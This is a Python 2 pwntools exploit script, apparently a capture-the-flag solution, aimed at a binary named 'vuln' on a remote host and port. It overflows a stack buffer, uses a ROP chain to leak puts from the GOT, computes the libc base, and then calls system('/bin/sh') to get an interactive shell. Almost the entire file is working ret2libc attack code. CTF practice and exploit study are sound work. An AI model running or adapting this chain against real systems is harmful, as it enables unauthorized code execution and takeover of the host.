#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6') # libc-2.27 from Ubuntu Bionic
#p = process('./vuln')
p = remote('35.188.73.186', 1111)

# Receive the initial text
p.recv()

# Important addresses
puts = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x401223 # pop rdi; ret
ret = 0x40101a # ret
main = elf.symbols['main']

# For an explanation of the need for the ret gadget, please check the
# ROPEmporium Beginner's Guide under Common Pitfalls
#------------------------------------------------------
payload = 'A'*264 # Overflow to return address
payload += p64(ret) # This is needed here because of libc-2.27
payload += p64(pop_rdi) # Pop puts_got into rdi
payload += p64(puts_got)
payload += p64(puts) # Call puts(puts_got)
payload += p64(main) # Jump back to main

p.sendline(payload)

p.recvuntil('\n')

# Get puts libc leak and calculate important offsets
p.recvline()
leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))

# Redo the exploit but call system('/bin/sh')
p.recv()
payload = 'A'*264
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)

p.interactive()
